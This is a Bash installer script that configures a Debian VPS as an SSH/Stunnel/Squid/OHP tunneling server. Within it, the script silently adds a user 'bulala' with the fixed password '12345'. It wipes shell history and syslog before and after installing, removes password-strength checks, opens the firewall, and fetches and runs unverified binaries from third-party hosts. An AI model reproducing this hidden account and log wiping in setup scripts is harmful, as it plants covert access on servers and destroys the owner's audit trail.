#!/bin/bash
# VPS Installer
# Script by AzzPhuc

clear
cd ~
export DEBIAN_FRONTEND=noninteractive

function BONV-MSG(){
 echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
echo '                                                              
      ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
      ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
      ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
      ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
      ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
      ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
}

function InsEssentials(){
apt-get update
apt-get upgrade -y
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m Please wait..\e[0m"
apt autoremove --fix-missing -y > /dev/null 2>&1
apt remove --purge apache* ufw -y > /dev/null 2>&1
timedatectl set-timezone Asia/Manila > /dev/null 2>&1

apt install nano wget curl zip unzip tar gzip p7zip-full bc rc openssl cron net-tools dnsutils dos2unix screen bzip2 ccrypt lsof -y 2>/dev/null

if [[ "$(command -v firewall-cmd)" ]]; then
 apt remove --purge firewalld -y
 apt autoremove -y -f
fi

apt install iptables-persistent -y -f
systemctl restart netfilter-persistent &>/dev/null
systemctl enable netfilter-persistent &>/dev/null

apt install tuned -y -f > /dev/null 2>&1
 if [[ "$(command -v tuned-adm)" ]]; then
  systemctl enable tuned &>/dev/null
  systemctl restart tuned &>/dev/null
  tuned-adm profile throughput-performance 2>/dev/null
 fi

apt install dropbear stunnel4 privoxy ca-certificates nginx ruby apt-transport-https lsb-release squid jq tcpdump dsniff grepcidr screenfetch -y 2>/dev/null

apt install perl libnet-ssleay-perl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python dbus libxml-parser-perl shared-mime-info -y 2>/dev/null

gem install lolcat 2>/dev/null
apt autoremove --fix-missing -y &>/dev/null

rm -rf /etc/apt/sources.list.d/openvpn*
apt-key del E158C569 &> /dev/null
apt update 2>/dev/null
apt autoremove --fix-missing -y &>/dev/null
apt clean 2>/dev/null

if [[ "$(command -v squid)" ]]; then
 if [[ "$(squid -v | grep -Ec '(V|v)ersion\s4.6')" -lt 1 ]]; then
  apt remove --purge squid -y -f 2>/dev/null
  wget "http://security.debian.org/pool/updates/main/s/squid/squid-cgi_4.6-1+deb10u7_amd64.deb" -qO squid.deb
  dpkg -i squid.deb
  rm -f squid.deb
 else
  echo -e "Squid v4.6 already installed"
 fi
else
 apt install libecap3 squid-common squid-langpack -y -f 2>/dev/null
 wget "http://security.debian.org/pool/updates/main/s/squid/squid-cgi_4.6-1+deb10u7_amd64.deb" -qO squid.deb
 dpkg -i squid.deb
 rm -f squid.deb
fi

if [[ "$(command -v privoxy)" ]]; then
 apt remove privoxy -y -f 2>/dev/null
 wget -qO /tmp/privoxy.deb 'https://download.sourceforge.net/project/ijbswa/Debian/3.0.28%20%28stable%29%20stretch/privoxy_3.0.28-1_amd64.deb'
 dpkg -i  --force-overwrite /tmp/privoxy.deb
 rm -f /tmp/privoxy.deb
fi

## Running FFSend installation in background
rm -rf {/usr/bin/ffsend,/usr/local/bin/ffsend}
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running FFSend installation on background\e[0m"
screen -S ffsendinstall -dm bash -c "curl -4skL "https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/DebianNew/ffsend-v0.2.65-linux-x64-static" -o /usr/bin/ffsend && chmod a+x /usr/bin/ffsend"
hostnamectl set-hostname localhost &> /dev/null
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running DDoS-deflate installation on background\e[0m"
cat <<'ddosEOF'> /tmp/install-ddos.bash
#!/bin/bash
if [[ -e /etc/ddos ]]; then
 printf "%s\n" "DDoS-deflate already installed" && exit 1
else
 curl -4skL "https://github.com/jgmdev/ddos-deflate/archive/master.zip" -o ddos.zip
 unzip -qq ddos.zip
 rm -rf ddos.zip
 cd ddos-deflate-master
 echo -e "/r/n/r/n"
 ./install.sh &> /dev/null
 cd .. && rm -rf ddos-deflate-master
 systemctl start ddos &> /dev/null
 systemctl enable ddos &> /dev/null
fi
ddosEOF
screen -S ddosinstall -dm bash -c "bash /tmp/install-ddos.bash && rm -f /tmp/install-ddos.bash"

printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running Iptables configuration on background\e[0m"
cat <<'iptEOF'> /tmp/iptables-config.bash
#!/bin/bash
function ip_address(){
  local IP="$( ip addr | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -Ev "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$(curl -4s ipv4.icanhazip.com)"
  [ -z "${IP}" ] && IP="$(curl -4s ipinfo.io/ip)"
  [ ! -z "${IP}" ] && echo "${IP}" || echo 'ipaddress'
}
IPADDR="$(ip_address)"
PNET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
CIDR="172.29.0.0/16"
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X
iptables -A INPUT -s $IPADDR -p tcp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -s $IPADDR -p udp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -p tcp --dport 25 -j REJECT   
iptables -A FORWARD -p tcp --dport 25 -j REJECT
iptables -A OUTPUT -p tcp --dport 25 -j REJECT
iptables -I FORWARD -s $CIDR -j ACCEPT
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j SNAT --to-source $IPADDR
iptables -A INPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A INPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A INPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A INPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A INPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A FORWARD -m string --algo bm --string ".torrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "torrent" -j REJECT
iptables -A FORWARD -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A OUTPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables-save > /etc/iptables/rules.v4
iptEOF
screen -S configIptables -dm bash -c "bash /tmp/iptables-config.bash && rm -f /tmp/iptables-config.bash"

}

function rc_local(){
wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
chmod +x /usr/bin/badvpn-udpgw
ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
}


function ConfigOpenSSH(){
echo -e "[\e[32mInfo\e[0m] Configuring OpenSSH Service"
if [[ "$(cat < /etc/ssh/sshd_config | grep -c 'BonvScripts')" -eq 0 ]]; then
 cp /etc/ssh/sshd_config /etc/ssh/backup.sshd_config
fi
cat <<'EOFOpenSSH' > /etc/ssh/sshd_config
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
Port 22
Port 225
ListenAddress 0.0.0.0
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
#KeyRegenerationInterval 3600
#ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
PermitRootLogin yes
StrictModes yes
#RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes
#RhostsRSAAuthentication no
HostbasedAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PasswordAuthentication yes
X11Forwarding yes
X11DisplayOffset 10
#GatewayPorts yes
PrintMotd no
PrintLastLog yes
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
Banner /etc/banner
TCPKeepAlive yes
ClientAliveInterval 120
ClientAliveCountMax 2
UseDNS no
EOFOpenSSH

curl -4skL "https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/SshBanner" -o /etc/banner

sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password && sed -i 's|use_authtok ||g' /etc/pam.d/common-password

echo -e "[\e[33mNotice\e[0m] Restarting OpenSSH Service.."
/usr/sbin/useradd -p $(openssl passwd -1 12345) -s /bin/false -M bulala
systemctl restart ssh &> /dev/null
}


function ConfigDropbear(){
echo -e "[\e[32mInfo\e[0m] Configuring Dropbear.."
cat <<'EOFDropbear' > /etc/default/dropbear
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
NO_START=0
DROPBEAR_PORT=555
DROPBEAR_EXTRA_ARGS="-p 550"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
EOFDropbear

echo -e "[\e[33mNotice\e[0m] Restarting Dropbear Service.."
systemctl enable dropbear &>/dev/null
systemctl restart dropbear &>/dev/null
}


function ConfigStunnel(){
if [[ ! "$(command -v stunnel4)" ]]; then
 StunnelDir='stunnel'
 else
 StunnelDir='stunnel4'
fi
echo -e "[\e[32mInfo\e[0m] Configuring Stunnel.."
cat <<'EOFStunnel1' > "/etc/default/$StunnelDir"
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
EOFStunnel1

rm -f /etc/stunnel/*
echo -e "[\e[32mInfo\e[0m] Cloning Stunnel.pem.."
openssl req -new -x509 -days 9999 -nodes -subj "/C=VN/ST=AZZPHUC/L=DEV/O=NGO SY PHUC/CN= AZZPHUC PRO - Unlimited " -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null

echo -e "[\e[32mInfo\e[0m] Creating Stunnel server config.."
cat <<'EOFStunnel3' > /etc/stunnel/stunnel.conf
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0
 
[websocket]
accept = 445
connect = 127.0.0.1:80
 
[dropbear]
accept = 443
connect = 127.0.0.1:550

[openssh]
accept = 444
connect = 127.0.0.1:22

[openvpn]
accept = 587
connect = 127.0.0.1:110
EOFStunnel3

echo -e "[\e[33mNotice\e[0m] Restarting Stunnel.."
systemctl restart "$StunnelDir"
}


function ConfigProxy(){
echo -e "[\e[32mInfo\e[0m] Configuring Privoxy.."
rm -f /etc/privoxy/config*
cat <<'EOFprivoxy' > /etc/privoxy/config
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 127.0.0.1:25800
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
max-client-connections 4000
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
keep-alive-timeout 5
tolerate-pipelining 1
socket-timeout 300
EOFprivoxy
cat <<'EOFprivoxy2' > /etc/privoxy/user.action
{ +block }
/

{ -block }
IP-ADDRESS
127.0.0.1
EOFprivoxy2
sed -i "s|IP-ADDRESS|$(ip_address)|g" /etc/privoxy/user.action
echo -e "[\e[32mInfo\e[0m] Configuring Squid.."
rm -rf /etc/squid/sq*
cat <<'EOFsquid' > /etc/squid/squid.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298

acl VPN dst IP-ADDRESS/32
http_access allow VPN
http_access deny all
http_port 0.0.0.0:8000
http_port 0.0.0.0:8080
acl bonv src 0.0.0.0/0.0.0.0
no_cache deny bonv
dns_nameservers 1.1.1.1 1.0.0.1
visible_hostname localhost
EOFsquid
sed -i "s|IP-ADDRESS|$(ip_address)|g" /etc/squid/squid.conf

echo -e "[\e[33mNotice\e[0m] Restarting Privoxy Service.."
systemctl restart privoxy
echo -e "[\e[33mNotice\e[0m] Restarting Squid Service.."
systemctl restart squid


echo -e "[\e[32mInfo\e[0m] Configuring OHPServer"
if [[ ! -e /etc/ohpserver ]]; then
 mkdir /etc/ohpserver
 else
 rm -rf /etc/ohpserver/*
fi
curl -4skL "https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/DebianNew/ohpserver-linux32.zip" -o /etc/ohpserver/ohp.zip
unzip -qq /etc/ohpserver/ohp.zip -d /etc/ohpserver
rm -rf /etc/ohpserver/ohp.zip
chmod +x /etc/ohpserver/ohpserver

cat <<'Ohp1' > /etc/ohpserver/run
# OHPServer startup script
/etc/ohpserver/ohpserver -port 8085 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:550 > /etc/ohpserver/dropbear.log &
/etc/ohpserver/ohpserver -port 8086 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:225 > /etc/ohpserver/openssh.log &
/etc/ohpserver/ohpserver -port 8087 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:110 > /etc/ohpserver/openvpn.log &
/etc/ohpserver/ohpserver -port 8088 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:25980 > /etc/ohpserver/openvpn.log
Ohp1
chmod +x /etc/ohpserver/run

cat <<'Ohp2' > /etc/ohpserver/stop
# OHPServer stop script
lsof -t -i tcp:8085 -s tcp:listen | xargs kill 2>/dev/null ### Dropbear
lsof -t -i tcp:8086 -s tcp:listen | xargs kill 2>/dev/null ### OpenSSH
lsof -t -i tcp:8087 -s tcp:listen | xargs kill 2>/dev/null ### OpenVPN TCP RSA
lsof -t -i tcp:8088 -s tcp:listen | xargs kill 2>/dev/null ### OpenVPN TCP EC
Ohp2
chmod +x /etc/ohpserver/stop

cat <<'EOFohp' > /lib/systemd/system/ohpserver.service
[Unit]
Description=OpenHTTP Puncher Server
Wants=network.target
After=network.target

[Service]
ExecStart=/bin/bash /etc/ohpserver/run 2>/dev/null
ExecStop=/bin/bash /etc/ohpserver/stop 2>/dev/null
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOFohp
systemctl daemon-reload &>/dev/null
systemctl restart ohpserver.service &>/dev/null
systemctl enable ohpserver.service &>/dev/null
}


function ConfigWebmin(){
printf "%b\n" "\e[1;32m[\e[0mInfo\e[1;32m]\e[0m\e[97m running Webmin installation on background\e[0m"
cat <<'webminEOF'> /tmp/install-webmin.bash
#!/bin/bash
if [[ -e /etc/webmin ]]; then
 echo 'Webmin already installed' && exit 1
fi
rm -rf /etc/apt/sources.list.d/webmin*
echo 'deb https://download.webmin.com/download/repository sarge contrib' > /etc/apt/sources.list.d/webmin.list
apt-key del 1719003ACE3E5A41E2DE70DFD97A3AE911F63C51 &> /dev/null
wget -qO - https://download.webmin.com/jcameron-key.asc | apt-key add - &> /dev/null
apt update &> /dev/null
apt install webmin -y &> /dev/null
sed -i "s|\(ssl=\).\+|\10|" /etc/webmin/miniserv.conf
lsof -t -i tcp:10000 -s tcp:listen | xargs kill 2>/dev/null
systemctl restart webmin &> /dev/null
systemctl enable webmin &> /dev/null
webminEOF
screen -S webmininstall -dm bash -c "bash /tmp/install-webmin.bash && rm -f /tmp/install-webmin.bash"
}

function ConfigSyscript(){
echo -e "[\e[32mInfo\e[0m] Creating Startup scripts.."
if [[ ! -e /etc/bonveio ]]; then
 mkdir -p /etc/bonveio
fi
cat <<'EOFSH' > /etc/bonveio/startup.sh
export DEBIAN_FRONTEND=noninteractive
#apt clean
screen -S delexpuser -dm bash -c "/usr/local/sbin/delete_expired" &>/dev/null
EOFSH
chmod +x /etc/bonveio/startup.sh

echo 'clear' > /etc/profile.d/bonv.sh
echo 'screenfetch -p -A Debian | sed -r "/^\s*$/d" ' >> /etc/profile.d/bonv.sh
chmod +x /etc/profile.d/bonv.sh

echo "[Unit]
Description=Bonveio Startup Script
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/bonveio/startup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/bonveio.service
chmod +x /etc/systemd/system/bonveio.service
systemctl daemon-reload
systemctl start bonveio
systemctl enable bonveio &> /dev/null

#sed -i '/0\s*4\s*.*/d' /etc/cron.d/*
#sed -i '/0\s*4\s*.*/d' /etc/crontab
sed -i '/*.root\sreboot$/d' /etc/cron.d/*
sed -i '/*.root\sreboot$/d' /etc/crontab
echo -e "\r\n" >> /etc/crontab
echo -e "0 4\t* * *\troot\treboot" >> /etc/cron.d/reboot_sys
printf "%s" "0 */4  * * *  root  /usr/bin/screen -S delexpuser -dm bash -c '/usr/local/sbin/delete_expired'" > /etc/cron.d/autodelete_expireduser
systemctl restart cron
}

function UnistAll(){
 echo -e " Removing dropbear"
 sed -i '/Port 225/d' /etc/ssh/sshd_config
 sed -i '/Banner .*/d' /etc/ssh/sshd_config
 systemctl restart ssh
 systemctl stop dropbear
 apt remove --purge dropbear -y
 rm -f /etc/default/dropbear
 rm -rf /etc/dropbear/*
 echo -e " Removing stunnel"
 systemctl stop stunnel &> /dev/null
 systemctl stop stunnel4 &> /dev/null
 apt remove --purge stunnel -y
 rm -rf /etc/stunnel/*
 rm -rf /etc/default/stunnel*
 echo -e " Removing webmin"
 systemctl stop webmin
 apt remove --purge webmin -y
 rm -rf /etc/webmin/*;
 rm -f /etc/apt/sources.list.d/webmin*;
 echo -e "Removing squid"
 apt remove --purge squid -y
 rm -rf /etc/squid/*
 echo -e "Removing privoxy"
 apt remove --purge privoxy -y
 rm -rf /etc/privoxy/*
 systemctl stop badvpn-udpgw.service &>/dev/null
 systemctl disable badvpn-udpgw.service &>/dev/null
 rm -rf /usr/local/{share/man/man7/badvpn*,share/man/man8/badvpn*,bin/badvpn-*}
 echo -e " Finalizing.."
 rm -rf /etc/bonveio
 rm -rf /etc/banner
 systemctl disable bonveio &> /dev/null
 rm -rf /etc/systemd/system/bonveio.service
 rm -rf /etc/cron.d/b_reboot_job
 rm -rf /etc/cron.d/reboot_sys
 rm -rf /etc/cron.d/autodelete_expireduser
 systemctl restart cron &> /dev/null
 rm -rf /usr/local/sbin/{accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squi*,edit_stunne*,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock,activate_gtm_noload,deactivate_gtm_noload}
 rm -rf /etc/profile.d/bonv.sh
 rm -rf /tmp/*
 apt autoremove -y -f
 rm -rf /etc/ohpserver
 systemctl stop ohpserver.service &> /dev/null
 systemctl disable ohpserver.service &> /dev/null
 systemctl stop ohpserver-autorecon.service &>/dev/null
 systemctl disable ohpserver-autorecon.service &>/dev/null
 rm -rf /etc/systemd/system/ohpserver-autorecon.service
 rm -rf /lib/systemd/system/ohpserver.service
 rm -rf /lib/systemd/system/badvpn-udpgw.service
 systemctl daemon-reload &>/dev/null
 echo 3 > /proc/sys/vm/drop_caches
}

function InstallScript(){
if [[ ! -e /dev/net/tun ]]; then
 BONV-MSG
 echo -e "[\e[1;31m×\e[0m] You cant use this script without TUN Module installed/embedded in your machine, file a support ticket to your machine admin about this matter"
 echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
 exit 1
fi

rm -rf /root/.bash_history && echo '' > /var/log/syslog && history -c

## Start Installation
clear
clear
BONV-MSG
echo -e ""
InsEssentials
rc_local
ConfigOpenSSH
ConfigDropbear
ConfigStunnel
ConfigProxy
ConfigWebmin
ConfigSyscript

echo -e "[\e[32mInfo\e[0m] Finalizing installation process.."
ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
sed -i '/\/bin\/false/d' /etc/shells
sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
echo '/bin/false' >> /etc/shells
echo '/usr/sbin/nologin' >> /etc/shells
sleep 1
######

clear
clear
clear
bash /etc/profile.d/bonv.sh
BONV-MSG
rm -f DebianVPS-Installe*
rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
}


if [[ $EUID -ne 0 ]]; then
 BONV-MSG
 echo -e "[\e[1;31mError\e[0m] This script must be run as root, exiting..."
 exit 1
fi

case $1 in
 install)
 BONV-MSG
 InstallScript
 exit 1
 ;;
 uninstall|remove)
 BONV-MSG
 UnistAll
 clear
 BONV-MSG
 echo -e ""
 echo -e " Uninstallation complete."
 rm -f DebianVPS-*
 exit 1
 ;;
 help|--help|-h)
 BONV-MSG
 echo -e " install = Install script"
 echo -e " uninstall = Remove all services installed by this script"
 echo -e " help = show this help message"
 exit 1
 ;;
 *)
 BONV-MSG
 echo -e " Starting Installation"
 echo -e ""
 sleep 5
 InstallScript
 exit 1
 ;;
esac
